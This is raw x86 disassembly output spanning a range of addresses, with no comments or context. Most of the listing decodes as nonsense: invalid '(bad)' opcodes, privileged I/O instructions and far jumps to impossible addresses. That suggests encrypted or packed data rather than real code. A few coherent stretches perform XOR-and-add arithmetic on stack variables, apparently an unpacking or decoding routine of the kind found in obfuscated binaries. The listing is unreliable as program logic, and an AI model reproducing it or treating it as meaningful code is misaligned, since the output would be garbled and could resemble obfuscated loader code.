  4079d2:	fadd   DWORD PTR [ecx+0x1b]
  4079d5:	test   BYTE PTR [eax],0x84
  4079d8:	into   
  4079d9:	test   eax,0x1e31571c
  4079de:	xchg   ecx,eax
  4079df:	cmc    
  4079e0:	mov    ebx,DWORD PTR [edi+0x46734bf2]
  4079e6:	adc    eax,0x714c6b45
  4079eb:	ins    DWORD PTR es:[edi],dx
  4079ec:	xchg   esp,eax
  4079ed:	jmp    0x46c5:0x3bb04e0d
  4079f4:	mov    fs,WORD PTR [esi+0x64]
  4079f7:	std    
  4079f8:	or     ch,BYTE PTR [esi+eiz*8+0x77099388]
  4079ff:	dec    ecx
  407a00:	add    eax,0xc373a614
  407a05:	stc    
  407a06:	in     al,dx
  407a07:	inc    DWORD PTR [esi+0x5a507a3e]
  407a0d:	add    DWORD PTR [eax+0x3],esi
  407a10:	inc    esp
  407a11:	mov    ds:0xad0fd3ec,eax
  407a16:	add    al,0x6
  407a18:	jb     0x4079a9
  407a1a:	xor    esp,ebp
  407a1c:	push   ds
  407a1d:	(bad)  
  407a1f:	out    0x70,al
  407a21:	call   0xe545f450
  407a26:	mov    edi,0x89f6d83d
  407a2b:	jno    0x407a1a
  407a2d:	aam    0x5d
  407a2f:	pop    ebx
  407a30:	scas   eax,DWORD PTR es:[edi]
  407a31:	aam    0x2f
  407a33:	shr    DWORD PTR [esi+0x36],0x27
  407a37:	aaa    
  407a38:	test   BYTE PTR [ebp+0x39],dh
  407a3b:	lea    esp,[edi+0x76be2219]
  407a41:	out    0x76,al
  407a43:	rcl    DWORD PTR [edx+ecx*2-0x56],0x64
  407a48:	das    
  407a49:	jl     0x407a0b
  407a4b:	mov    dh,0x1f
  407a4d:	ds nop
  407a4f:	arpl   WORD PTR [esi+ebp*2+0x4c],bx
  407a53:	loop   0x407aa5
  407a55:	dec    edi
  407a56:	push   edx
  407a57:	jecxz  0x407ac6
  407a59:	hlt    
  407a5a:	pop    edx
  407a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a5c:	jnp    0x407a7f
  407a5e:	outs   dx,BYTE PTR ds:[esi]
  407a5f:	adc    ebp,DWORD PTR [ecx-0x5e]
  407a62:	jb     0x407a46
  407a64:	aas    
  407a65:	or     ch,BYTE PTR [edx-0x1a]
  407a68:	popf   
  407a69:	daa    
  407a6a:	or     al,0x1b
  407a6c:	xlat   BYTE PTR ds:[ebx]
  407a6d:	mov    al,ds:0x401ee6a0
  407a72:	jg     0x407ab6
  407a74:	gs sub al,0xa0
  407a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a78:	test   eax,0xc181ce8
  407a7d:	sar    BYTE PTR [eax],cl
  407a7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a80:	add    esp,DWORD PTR [ecx-0x20]
  407a83:	(bad)  
  407a84:	pop    ds
  407a85:	lahf   
  407a86:	sbb    ebx,DWORD PTR [ebx-0x74107eb3]
  407a8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a8d:	xor    eax,0xbcc0fd5f
  407a92:	push   0x54
  407a94:	(bad)
  407a97:	and    eax,0xf1bb0845
  407a9c:	leave  
  407a9d:	out    dx,eax
  407a9e:	mov    ds:0x4eada52a,eax
  407aa3:	jecxz  0x407a56
  407aa5:	test   BYTE PTR [esi+0x75ce9d2c],0x8c
  407aac:	inc    edx
  407aad:	xchg   DWORD PTR [edi-0x394d3535],ebp
  407ab3:	mov    esi,DWORD PTR [edx]
  407ab5:	ins    DWORD PTR es:[edi],dx
  407ab6:	int    0x9
  407ab8:	xor    al,0xb2
  407aba:	or     BYTE PTR [ebx+esi*4-0x4903e475],bl
  407ac1:	mov    dh,0x40
  407ac3:	lock inc esi
  407ac5:	pop    edi
  407ac6:	add    al,0xc8
  407ac8:	xor    al,0xd1
  407aca:	les    ebx,FWORD PTR [edi]
  407acc:	push   0x49f1ed12
  407ad1:	pop    es
  407ad2:	test   DWORD PTR [ecx],ecx
  407ad4:	mov    al,0xee
  407ad6:	jmp    0xb1f2:0xea2b29de
  407add:	dec    ebp
  407ade:	jmp    0x407a63
  407ae0:	sub    ebp,DWORD PTR ds:0x4e13d60c
  407ae6:	and    eax,0xf97d9fa8
  407aeb:	xor    BYTE PTR [ebp+0x1126ddfa],dh
  407af1:	fs data16 aaa 
  407af4:	xchg   DWORD PTR [eax+0x5feb2504],ebx
  407afa:	pop    ebx
  407afb:	mov    eax,DWORD PTR [ebp-0x10]
  407afe:	xor    DWORD PTR [eax],0x2650fa8c
  407b04:	jmp    0x4072df
  407b09:	mov    ax,WORD PTR [ebp-0x4]
  407b0d:	mov    edi,DWORD PTR [ebp+0x8]
  407b10:	mov    edi,DWORD PTR [edi]
  407b12:	mov    edx,0x8a38
  407b17:	xor    ax,dx
  407b1a:	mov    edx,0x3afe
  407b1f:	add    ax,dx
  407b22:	jmp    0x407f10
  407b27:	int    0x82
  407b29:	adc    al,0x54
  407b2b:	push   ebp
  407b2c:	pop    esp
  407b2d:	dec    ebp
  407b2e:	xchg   ebx,eax
  407b2f:	leave  
  407b30:	mul    BYTE PTR [ebx-0x4e]
  407b33:	xor    BYTE PTR [edi+edi*8-0x59],al
  407b37:	pop    ecx
  407b38:	(bad)  
  407b39:	jle    0x407bb9
  407b3b:	dec    edi
  407b3c:	jns    0x407bbc
  407b3e:	jle    0x407b02
  407b40:	push   0xffffff92
  407b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b43:	add    edi,DWORD PTR [ecx+0xe]
  407b46:	repz in eax,dx
  407b48:	inc    ebp
  407b49:	mov    al,0x15
  407b4b:	aaa    
  407b4c:	fst    DWORD PTR [esi]
  407b4e:	cmp    BYTE PTR [ecx+0x3d],ch
  407b51:	test   eax,0x302bef24
  407b56:	int    0x29
  407b58:	mov    dl,0xb0
  407b5a:	jne    0x407aee
  407b5c:	(bad)  
  407b5d:	es sub al,0x3d
  407b60:	stc    
  407b61:	stos   BYTE PTR es:[edi],al
  407b62:	push   ebx
  407b63:	dec    BYTE PTR [esi+0x24]
  407b66:	or     ebx,DWORD PTR [edx]
  407b68:	mov    dh,0xa
  407b6a:	and    BYTE PTR [ebx],al
  407b6c:	inc    edi
  407b6d:	and    BYTE PTR [esi+0x66],al
  407b70:	pop    ds
  407b71:	cmp    al,0xd8
  407b73:	mov    edi,0xf5ebe283
  407b78:	jge    0x407b4e
  407b7a:	mov    esp,0x3218ad3b
  407b7f:	in     al,0x9c
  407b81:	mov    esi,gs
  407b83:	add    dh,dh
  407b85:	loop   0x407ba8
  407b87:	adc    ebx,esp
  407b89:	push   cs
  407b8a:	pop    es
  407b8b:	cwde   
  407b8c:	pop    edi
  407b8d:	inc    eax
  407b8e:	in     al,dx
  407b8f:	int    0xfb
  407b91:	push   es
  407b92:	add    al,ch
  407b94:	cmp    DWORD PTR [edi+0x158ccb65],edx
  407b9a:	xchg   BYTE PTR [eax+edx*4],cl
  407b9d:	mov    ah,BYTE PTR [edi]
  407b9f:	jg     0x407b57
  407ba1:	jbe    0x407bf3
  407ba3:	(bad)
  407ba6:	pop    esp
  407ba7:	(bad)  
  407ba8:	fsubp  st(2),st
  407baa:	lods   al,BYTE PTR ds:[esi]
  407bab:	jnp    0x407b41
  407bad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bae:	and    DWORD PTR [esi],edi
  407bb0:	xor    DWORD PTR [eax],edi
  407bb2:	add    DWORD PTR [eax],eax
  407bb4:	inc    esp
  407bb5:	inc    ebp
  407bb6:	jecxz  0x407b61
  407bb8:	out    dx,eax
  407bb9:	inc    ebx
  407bba:	adc    al,0x8
  407bbc:	je     0x407bc1
  407bbe:	stos   DWORD PTR es:[edi],eax
  407bbf:	mov    dl,0x2
  407bc1:	push   es
  407bc2:	sbb    al,0x53
  407bc4:	pop    ebp
  407bc5:	pop    ebp
  407bc6:	and    ah,BYTE PTR [ebp-0x49]
  407bc9:	sti    
  407bca:	shl    DWORD PTR [ebp-0x74],cl
  407bcd:	push   ss
  407bce:	nop
  407bcf:	inc    esi
  407bd0:	push   edi
  407bd1:	push   0x5ab011f4
  407bd6:	mov    ds:0x99974073,al
  407bdb:	or     bh,dh
  407bdd:	ret    0xa41e
  407be0:	adc    DWORD PTR [edx+0x2d3222e0],ebx
  407be6:	lods   eax,DWORD PTR es:[esi]
  407be8:	push   0x60
  407bea:	xchg   esp,eax
  407beb:	or     DWORD PTR [edi+edi*1-0x37],esp
  407bef:	and    DWORD PTR [ecx],ebp
  407bf1:	lahf   
  407bf2:	cli    
  407bf3:	mul    DWORD PTR [edx+0x560aad6b]
  407bf9:	pop    ss
  407bfa:	daa    
  407bfb:	cli    
  407bfc:	mov    esi,0x72ed882c
  407c01:	sub    esp,DWORD PTR [edx+0x9]
  407c04:	and    edx,edx
  407c06:	add    DWORD PTR ds:0xd9dd54eb,edi
  407c0c:	push   0x79afeaeb
  407c11:	add    ebx,ebx
  407c13:	out    0xe8,eax
  407c15:	cdq    
  407c16:	and    eax,0xc6886d4f
  407c1b:	xor    edi,DWORD PTR ds:[ebp+ebp*8+0x7597b9a]
  407c23:	sbb    al,BYTE PTR [ebx]
  407c25:	call   0x7196e309
  407c2a:	jge    0x407bd4
  407c2c:	test   BYTE PTR [ebx+0x20],dl
  407c2f:	mul    ecx
  407c31:	add    dh,BYTE PTR [ecx-0x414ade21]
  407c37:	add    eax,0x332c3950
  407c3c:	or     bh,BYTE PTR [ecx]
  407c3e:	pop    eax
  407c3f:	test   eax,0x7edc8876
  407c44:	push   ebp
  407c45:	mov    ecx,0xb5bc4fd1
  407c4a:	xchg   ebx,eax
  407c4b:	arpl   WORD PTR [eax+0x5f0b9083],sp
  407c51:	pusha  
  407c52:	jg     0x407c2a
  407c54:	cmp    BYTE PTR [edi],bh
  407c56:	or     DWORD PTR [edi+0x6ef25fbd],ecx
  407c5c:	sbb    eax,0x23cde355
  407c61:	inc    esp
  407c62:	(bad)  
  407c63:	std    
  407c64:	inc    ebx
  407c65:	pop    esp
  407c66:	adc    eax,0x38ae4ec6
  407c6b:	daa    
  407c6c:	int3   
  407c6d:	add    dh,BYTE PTR [esi+ebx*2-0x67d6a8fa]
  407c74:	fiadd  WORD PTR [ecx+0x2d88e43b]
  407c7a:	lea    esp,[ecx]
  407c7c:	pop    esi
  407c7d:	lock xchg bh,al
  407c80:	add    ch,BYTE PTR [ebx+ebx*4-0x1b]
  407c84:	fs adc eax,0x1948679f
  407c8a:	sbb    eax,0xa5cb2abb
  407c8f:	mov    ebp,0xfb0f4de9
  407c94:	add    ecx,eax
  407c96:	push   es
  407c97:	(bad)  
  407c98:	jbe    0x407d0f
  407c9a:	das    
  407c9b:	adc    DWORD PTR [edx-0x1d],ecx
  407c9e:	push   0x7a
  407ca0:	stos   DWORD PTR es:[edi],eax
  407ca1:	push   edi
  407ca2:	in     eax,0x1e
  407ca4:	in     eax,0xd8
  407ca6:	out    0x78,eax
  407ca8:	jae    0x407c55
  407caa:	in     eax,dx
  407cab:	mov    ah,0x3c
  407cad:	sbb    cl,BYTE PTR [edi-0x10]
  407cb0:	sub    edi,edx
  407cb2:	neg    ch
  407cb4:	iret   
  407cb5:	xchg   edx,eax
  407cb6:	add    al,0x30
  407cb8:	in     eax,0xa0
  407cba:	jmp    0x79dcdb29
  407cbf:	lods   al,BYTE PTR ds:[esi]
  407cc0:	pop    ebx
  407cc1:	arpl   WORD PTR [edx+0x11],cx
  407cc4:	xchg   edx,eax
  407cc5:	hlt    
  407cc6:	fild   DWORD PTR ds:0x67440381
  407ccc:	push   ebx
  407ccd:	and    esi,0xffffffdc
  407cd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cd1:	popaw  
  407cd3:	jge    0x407d3a
  407cd5:	adc    BYTE PTR [esi],ch
  407cd7:	fdivr  DWORD PTR [edi]
  407cd9:	push   ebp
  407cda:	pop    ss
  407cdb:	out    dx,eax
  407cdc:	int    0x88
  407cde:	rol    BYTE PTR [edi+esi*2+0x7a10601b],1
  407ce5:	rcr    DWORD PTR [esi+0x4ca21cdb],0x99
  407cec:	push   ebp
  407ced:	dec    esi
  407cee:	cmp    eax,ebx
  407cf0:	adc    al,BYTE PTR [ebx]
  407cf2:	addr16 jle 0x407cdb
  407cf5:	jno    0x407cfb
  407cf7:	sti    
  407cf8:	outs   dx,BYTE PTR ds:[esi]
  407cf9:	fstp   DWORD PTR [ebp+0x4f]
  407cfc:	clc    
  407cfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cfe:	push   ebp
  407cff:	add    DWORD PTR [esi+0x515731ab],0xea8dd39a
  407d09:	jp     0x407d77
  407d0b:	adc    al,0xdb
  407d0d:	xchg   esi,eax
  407d0e:	mov    ecx,0x37dcaaba
  407d13:	fcomp  QWORD PTR [eax+0x52]
  407d16:	and    DWORD PTR [ecx+0x7e7a6b1f],ebx
  407d1c:	lods   al,BYTE PTR ds:[esi]
  407d1d:	imul   esp,esi,0x6e
  407d20:	jbe    0x407d5e
  407d22:	icebp  
  407d23:	sub    al,0xc3
  407d25:	sub    esi,DWORD PTR [ebx]
  407d27:	retf   0xade
  407d2a:	sar    DWORD PTR [ecx],0x3f
  407d2d:	sbb    dh,ch
  407d2f:	fcomp  QWORD PTR [ecx]
  407d31:	fimul  WORD PTR [eax+0x5b]
  407d34:	jecxz  0x407d96
  407d36:	jl     0x407d66
  407d38:	jp     0x407d01
  407d3a:	je     0x407ce2
  407d3c:	jns    0x407cdb
  407d3e:	int    0x43
  407d40:	pop    edi
  407d41:	add    al,BYTE PTR [edi+0x6e]
  407d44:	stos   DWORD PTR es:[edi],eax
  407d45:	ret    0xe66c
  407d48:	xor    BYTE PTR [edx+0x7c],dh
  407d4b:	rol    eax,1
  407d4d:	repz and cl,dh
  407d50:	test   BYTE PTR [edi-0x164e67d2],bh
  407d56:	cmp    eax,0xf11982f2
  407d5b:	mov    esp,0x92f472e2
  407d60:	(bad)
  407d64:	add    BYTE PTR [si+0x18],bl
  407d68:	push   0x5c6365a3
  407d6d:	push   ds
  407d6e:	stc    
  407d6f:	pop    ebp
  407d70:	(bad)  
  407d71:	call   0xa2d4:0xee81799
  407d78:	xlat   BYTE PTR ds:[ebx]
  407d79:	das    
  407d7a:	pop    ds
  407d7b:	cmp    al,0x25
  407d7d:	aad    0xf9
  407d7f:	test   DWORD PTR [edi],eax
  407d81:	cmc    
  407d82:	inc    ebx
  407d83:	ss scas al,BYTE PTR es:[edi]
  407d85:	jo     0x407d3d
  407d87:	mov    edx,0xd1a385db
  407d8c:	sbb    edx,DWORD PTR [eax+0x3cb2deec]
  407d92:	test   al,0x98
  407d94:	and    eax,edx
  407d96:	mov    dl,0x69
  407d98:	mov    dl,0x17
  407d9a:	mov    ebp,0x652d99a1
  407d9f:	cmp    DWORD PTR [eax-0xb],ebp
  407da2:	jmp    0x407df3
  407da4:	mov    ebx,ebx
  407da6:	stc    
  407da7:	jle    0x407e06
  407da9:	jmp    0x81d1d708
  407dae:	push   ss
  407daf:	push   0x90c835b6
  407db4:	lea    esp,[eax-0x21f0d996]
  407dba:	xor    ah,BYTE PTR [edx]
  407dbc:	aas    
  407dbd:	xchg   esp,eax
  407dbe:	mov    ds:0x2d9ba6b2,al
  407dc3:	stos   BYTE PTR es:[edi],al
  407dc4:	sbb    ecx,DWORD PTR [esi+0x5a8f3ac8]
  407dca:	ja     0x407e28
  407dcc:	loope  0x407dd7
  407dce:	xor    al,0xc3
  407dd0:	mov    dl,0x9c
  407dd2:	call   0x9f0:0x988e6aa4
  407dd9:	inc    eax
  407dda:	dec    di
  407ddc:	sti    
  407ddd:	in     eax,dx
  407dde:	retf   
  407ddf:	hlt    
  407de0:	outs   dx,BYTE PTR ds:[esi]
  407de1:	adc    DWORD PTR [edx],eax
  407de3:	xchg   esp,eax
  407de4:	ror    BYTE PTR [ecx],0xe2
  407de7:	xchg   esp,eax
  407de8:	(bad)  
  407de9:	in     eax,dx
  407dea:	ss ja  0x407d9a
  407ded:	sub    sp,WORD PTR [edi+0x1c]
  407df1:	xchg   DWORD PTR [ecx+0x6a],ebx
  407df4:	xor    DWORD PTR ds:0xe7d9beca,esp
  407dfa:	fiadd  DWORD PTR [esp+ebp*2]
  407dfd:	mov    ds:0xb4c1a3a1,al
  407e02:	test   DWORD PTR [ebx+0x1e],0x794aa3e5
  407e09:	or     DWORD PTR [edi],esp
  407e0b:	fistp  WORD PTR [esi+ebp*4]
  407e0e:	retf   
  407e0f:	aas    
  407e10:	cs sete bl
  407e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e15:	in     eax,0x3c
  407e17:	psubusb mm4,QWORD PTR [ebp-0x51]
  407e1b:	push   eax
  407e1c:	push   esi
  407e1d:	pop    es
  407e1e:	js     0x407e31
  407e20:	xchg   ebx,eax
  407e21:	push   es
  407e22:	int3   
  407e23:	fnstenv [esi+edx*2-0x10]
  407e27:	jnp    0x407e5d
  407e29:	in     eax,dx
  407e2a:	and    BYTE PTR [ecx],0x92
  407e2d:	mov    al,ds:0xd4fca366
  407e32:	jg     0x407ea9
  407e34:	sbb    ebx,eax
  407e36:	out    dx,al
  407e37:	nop
  407e38:	jge    0x407eb3
  407e3a:	outs   dx,BYTE PTR ds:[esi]
  407e3b:	adc    al,0x86
  407e3d:	inc    edi
  407e3e:	mov    esp,0xeb81292
  407e43:	ffree  st(7)
  407e45:	add    ah,al
  407e47:	nop
  407e48:	push   ebp
  407e49:	sub    eax,0x9510a955
  407e4e:	inc    esp
  407e4f:	dec    ebp
  407e50:	cmp    edx,DWORD PTR ds:0xbc42de05
  407e56:	cmp    cl,0xdf
  407e59:	(bad)  
  407e5a:	fistp  WORD PTR [edx]
  407e5c:	lea    ecx,[edx]
  407e5e:	js     0x407e1a
  407e60:	sbb    BYTE PTR [ebx+0x30],cl
  407e63:	adc    eax,0x23fa1f08
  407e68:	push   eax
  407e69:	int3   
  407e6a:	xchg   ebx,eax
  407e6b:	xchg   ebp,eax
  407e6c:	push   es
  407e6d:	lahf   
  407e6e:	or     BYTE PTR [ebx-0x1e],ah
  407e71:	mov    esi,0x73f18630
  407e76:	mov    ds:0x1b37aec1,eax
  407e7b:	add    DWORD PTR [edi+0x18],ebx
  407e7e:	jle    0x407e9f
  407e80:	fsub   QWORD PTR [esi]
  407e82:	mov    ?,ebx
  407e84:	fwait
  407e85:	xlat   BYTE PTR ds:[ebx]
  407e86:	js     0x407e23
  407e88:	mov    ebx,ebx
  407e8a:	sti    
  407e8b:	popa   
  407e8c:	inc    esp
  407e8d:	add    ecx,DWORD PTR es:[ecx-0x42]
  407e91:	scas   al,BYTE PTR es:[edi]
  407e92:	cmc    
  407e93:	test   DWORD PTR [esi+0x29],0x71272eb7
  407e9a:	and    al,0x48
  407e9c:	inc    eax
  407e9d:	int3   
  407e9e:	mov    edx,DWORD PTR [ebx+0x3ecfc74c]
  407ea4:	jo     0x407f0d
  407ea6:	leave  
  407ea7:	xlat   BYTE PTR ds:[ebx]
  407ea8:	xor    eax,0x709d32cc
  407ead:	sti    
  407eae:	outs   dx,DWORD PTR ds:[esi]
  407eaf:	out    0xd9,eax
  407eb1:	push   es
  407eb2:	cmp    ecx,DWORD PTR [ebp+0x75]
  407eb5:	xchg   esi,eax
  407eb6:	scas   al,BYTE PTR es:[edi]
  407eb7:	push   esp
  407eb8:	mov    ebx,0xa3397267
  407ebd:	pop    edi
  407ebe:	mov    BYTE PTR [eax+eax*2-0x2545927d],cl
  407ec5:	dec    ebp
  407ec6:	test   DWORD PTR [ecx-0x2e3c61bf],ecx
  407ecc:	mov    cl,0x7a
  407ece:	lods   eax,DWORD PTR ds:[esi]
  407ecf:	xor    BYTE PTR [bp+di+0x344],ch
  407ed4:	bound  edi,QWORD PTR [eax-0x5f5cac73]
  407eda:	(bad)  
  407edc:	inc    esp
  407edd:	imul   edi,DWORD PTR [ebx+edx*1-0x4fb93478],0x220c26a6
  407ee8:	test   al,0x47
  407eea:	lods   eax,DWORD PTR ds:[esi]
  407eeb:	jns    0x407ed3
  407eed:	mov    ds:0xb78789df,al
  407ef2:	jge    0x407ec5
  407ef4:	jmp    0x407ed1
  407ef6:	(bad)  
  407ef7:	out    dx,al
  407ef8:	shl    DWORD PTR [ecx],1
  407efa:	mov    al,0x4c
  407efc:	pop    esi
  407efd:	cs nop
  407eff:	outs   dx,BYTE PTR ds:[esi]
  407f00:	inc    ecx
  407f01:	fxch   st(7)
  407f03:	and    al,0x2b
  407f05:	lods   al,BYTE PTR ds:[esi]
  407f06:	loopne 0x407ee4
  407f08:	es push ecx
  407f0a:	jmp    0xf8718b1a
  407f0f:	mov    bh,0x66
  407f11:	cmp    eax,DWORD PTR [edi]
  407f13:	je     0x407f60
  407f19:	mov    eax,DWORD PTR [ebp-0x14]
  407f1c:	xor    eax,ecx
  407f1e:	add    eax,esi
  407f20:	mov    DWORD PTR [ebp-0x24],eax
  407f23:	mov    eax,DWORD PTR [ebp-0x28]
  407f26:	mov    di,WORD PTR [ebp-0x2c]
  407f2a:	mov    ebx,0x8a38
  407f2f:	xor    di,bx
  407f32:	add    di,dx
  407f35:	movzx  edx,di
  407f38:	mov    edi,DWORD PTR [ebp-0x8]
  407f3b:	xor    edi,ecx
  407f3d:	lea    edx,[edx+edi*1+0x327299]
  407f44:	add    DWORD PTR [eax],edx
  407f46:	mov    eax,DWORD PTR [ebp-0x20]
  407f49:	mov    edx,DWORD PTR [ebp-0x8]
  407f4c:	mov    edi,DWORD PTR [ebp-0x24]
  407f4f:	xor    edx,ecx
  407f51:	add    edx,esi
  407f53:	imul   edx,edi
  407f56:	sub    DWORD PTR [eax],edx
  407f58:	mov    eax,DWORD PTR [ebp-0x14]
  407f5b:	jmp    0x4072e2
  407f60:	mov    eax,DWORD PTR [ebp-0xc]
  407f63:	mov    edx,DWORD PTR [ebp-0x18]
  407f66:	jmp    0x408354
  407f6b:	fadd   st,st(0)
  407f6d:	test   eax,0x6177b1f6
  407f72:	ror    BYTE PTR [ebx],1
  407f74:	ins    DWORD PTR es:[edi],dx
  407f75:	pop    eax
  407f76:	jl     0x407f80
  407f78:	outs   dx,DWORD PTR ds:[esi]
  407f79:	addr16 inc esp
  407f7b:	stos   BYTE PTR es:[edi],al
  407f7c:	sar    BYTE PTR [esi+0x7e],cl
  407f7f:	dec    edi
  407f80:	jns    0x408000
  407f82:	jle    0x407f76
  407f84:	xor    BYTE PTR ds:0x41ddaa90,bh
  407f8a:	xlat   BYTE PTR ds:[ebx]
  407f8b:	push   ss
  407f8c:	sbb    esp,edi
  407f8e:	push   ebx
  407f8f:	adc    DWORD PTR [edx+0x6ce3be6f],ebx
  407f95:	add    cl,cl
  407f97:	(bad)  
  407f98:	jns    0x407f9b
  407f9a:	int3   
  407f9b:	inc    esp
  407f9c:	popf   
  407f9d:	xor    eax,0xf62bba97
  407fa2:	inc    edx
  407fa3:	(bad)  
  407fa4:	xor    DWORD PTR [edi],esi
  407fa6:	in     al,0xa5
  407fa8:	mov    ?,WORD PTR [eax]
  407faa:	mov    bh,0x24
  407fac:	jnp    0x407fff
  407fae:	shr    BYTE PTR [esi],cl
  407fb0:	xchg   esi,eax
  407fb1:	sti    
  407fb2:	push   ebx
  407fb3:	push   ds
  407fb4:	add    ah,bh
  407fb6:	push   ds
  407fb7:	adc    edi,edx
  407fb9:	jae    0x40801d
  407fbb:	vmulsd xmm3,xmm7,xmm2
  407fbf:	mov    ah,0xf4
  407fc1:	(bad)  
  407fc2:	inc    esp
  407fc3:	xlat   BYTE PTR ds:[ebx]
  407fc4:	and    BYTE PTR [edx+edi*2+0x1],ah
  407fc8:	outs   dx,DWORD PTR ds:[esi]
  407fc9:	gs mov al,0xb8
  407fcc:	loope  0x407f57
  407fce:	icebp  
  407fcf:	bound  ebx,QWORD PTR [ecx+ecx*1+0x4]
  407fd3:	add    al,0x91
  407fd5:	out    0x78,al
  407fd7:	cs scas eax,DWORD PTR es:[edi]
  407fd9:	div    ecx
  407fdb:	aas    
  407fdc:	test   DWORD PTR [ecx+edi*8],edx
  407fdf:	and    eax,0x7eee386c
  407fe4:	ror    DWORD PTR ds:0x5bb0a505,1
  407fea:	clc    
  407feb:	mov    esi,0xdf12d11f
  407ff0:	lahf   
  407ff1:	das    
  407ff2:	jle    0x408032
  407ff4:	mov    esp,0x81f4fc9f
  407ff9:	ror    dh,cl
  407ffb:	mov    DWORD PTR [edx+ecx*2-0x2f],edi
  407fff:	mov    BYTE PTR [ecx+0x3ccaa852],cl
  408005:	fwait
  408006:	shl    BYTE PTR [edi],0xcd
  408009:	jecxz  0x407fc3
  40800b:	pop    ss
  40800c:	stos   DWORD PTR es:[edi],eax
  40800d:	outs   dx,BYTE PTR ds:[esi]
  40800e:	jmp    0x6de:0xb4053be2
  408015:	dec    ebx
  408016:	adc    al,0x2c
  408018:	sub    al,0x4
  40801a:	add    cl,BYTE PTR [ebx+ebx*1-0x61]
  40801e:	lea    ebx,[edi+eax*2-0x31ef3bc0]
  408025:	shl    cl,cl
  408027:	sbb    ch,cl
  408029:	xor    cl,BYTE PTR [eax-0x5778bba4]
  40802f:	(bad)  
  408030:	lods   eax,DWORD PTR ds:[esi]
  408031:	xchg   edi,eax
  408032:	in     eax,dx
  408033:	cs inc ebp
  408035:	stos   BYTE PTR es:[edi],al
  408036:	pop    ebx
  408037:	add    dl,BYTE PTR [esi-0x15]
  40803a:	lock fisub WORD PTR [ecx-0x18]
  40803e:	add    edi,esi
  408040:	xchg   edx,eax
  408041:	outs   dx,BYTE PTR ds:[esi]
  408042:	imul   esp,ebx,0x45
  408045:	retf   0x1c66
  408048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408049:	(bad)  [ebp+0x732c294c]
  40804f:	inc    eax
  408050:	lods   eax,DWORD PTR ds:[esi]
  408051:	dec    eax
  408052:	and    al,0xe2
  408054:	fcomp  QWORD PTR [eax-0x21]
  408057:	scas   al,BYTE PTR es:[edi]
  408058:	pop    edx
  408059:	push   edi
  40805a:	nop
  40805b:	sub    ch,0x7c
  40805e:	cmp    eax,0x6f8b6e92
  408063:	push   edi
  408064:	aas    
  408065:	jl     0x4080c9
  408067:	ja     0x40803f
  408069:	sbb    ah,ah
  40806b:	aad    0x4a
  40806d:	inc    ecx
  40806e:	adc    DWORD PTR [ebx-0x7c],ebp
  408071:	xor    BYTE PTR [ebp+0xe],bl
  408074:	pop    ss
  408075:	mov    ebp,0xce89a18d
  40807b:	gs add eax,0xd2ed1e55
  408081:	or     esi,DWORD PTR [ebx]
  408083:	out    0x1f,al
  408085:	pop    ebx
  408086:	dec    eax
  408087:	or     al,0xfe
  408089:	sub    al,0xeb
  40808b:	sub    eax,DWORD PTR [edi+0x6d4ead56]
  408091:	ds ds inc ecx
  408094:	test   al,0x6b
  408096:	bound  esp,QWORD PTR [eax+0x78]
  408099:	pushf  
  40809a:	sbb    al,0xd7
  40809c:	jp     0x408059
  40809e:	icebp  
  40809f:	sbb    al,bl
  4080a1:	pusha  
  4080a2:	pushf  
  4080a3:	(bad)  
  4080a4:	fidivr DWORD PTR [ecx-0xeb8c81b]
  4080aa:	sub    dl,BYTE PTR [ecx-0xb6acd1a]
  4080b0:	popa   
  4080b1:	push   ss
  4080b2:	jo     0x40809a
  4080b4:	(bad)  
  4080b5:	dec    esp
  4080b6:	jo     0x40804c
  4080b8:	test   esp,ebx
  4080ba:	imul   eax,DWORD PTR [ecx],0x3b
  4080bd:	jmp    0x4080a8
  4080bf:	xor    al,0x9
  4080c1:	cdq    
  4080c2:	push   ecx
  4080c3:	push   ebp
  4080c4:	mov    al,0xc9
  4080c6:	mov    ebx,0xbc799551
  4080cb:	jge    0x4080e8
  4080cd:	sahf   
  4080ce:	neg    DWORD PTR [edi]
  4080d0:	xchg   esi,eax
  4080d1:	dec    esp
  4080d2:	daa    
  4080d3:	call   0x96fa:0x18595636
  4080da:	test   eax,0x7e0f9ba9
  4080df:	xchg   edi,eax
  4080e0:	into   
  4080e1:	pop    es
  4080e2:	xor    DWORD PTR [eax+0x2abba6a9],esi
  4080e8:	cmp    edi,ebp
  4080ea:	jne    0x408125
  4080ec:	ror    esi,1
  4080ee:	jmp    0x9fb4:0x88a615c6
  4080f5:	movsx  edx,WORD PTR ds:0xc6e4695f
  4080fc:	int    0xc0
  4080fe:	out    dx,al
  4080ff:	ror    DWORD PTR [ebp-0x1a],1
  408102:	pop    ebp
  408103:	sub    al,0x14
  408105:	test   dl,0x2b
  408108:	loopne 0x4080c1
  40810a:	xchg   edi,eax
  40810b:	and    DWORD PTR [edx+0x6e],ebp
  40810e:	scas   al,BYTE PTR es:[edi]
  40810f:	add    al,0x9d
  408111:	call   0x5273:0x1b9dad5e
  408118:	enter  0xa6b0,0x6a
  40811c:	cmp    eax,eax
  40811e:	mov    bh,0x71
  408120:	lods   eax,DWORD PTR ds:[esi]
  408121:	out    dx,eax
  408122:	jns    0x408169
  408124:	dec    eax
  408125:	push   ebp
  408126:	scas   eax,DWORD PTR es:[edi]
  408127:	pop    eax
  408128:	mov    ebx,0x5aea27be
  40812d:	cli    
  40812e:	ficomp WORD PTR [ebp-0x7e8e2ea6]
  408134:	repz das 
  408136:	mov    edx,0x83bc1a19
  40813b:	js     0x4080e6
  40813d:	out    dx,al
  40813e:	cmp    DWORD PTR [edx],eax
  408140:	mul    BYTE PTR [ebp-0x35]
  408143:	push   esp
  408144:	imul   esi,DWORD PTR [ebx],0xffffffb2
  408147:	data16 mov ah,0xf7
  40814a:	xor    bl,0xaa
  40814d:	addr16 retf 0x76ac
  408151:	xchg   bh,dl
  408153:	ss dec eax
  408155:	out    dx,al
  408156:	jle    0x40812e
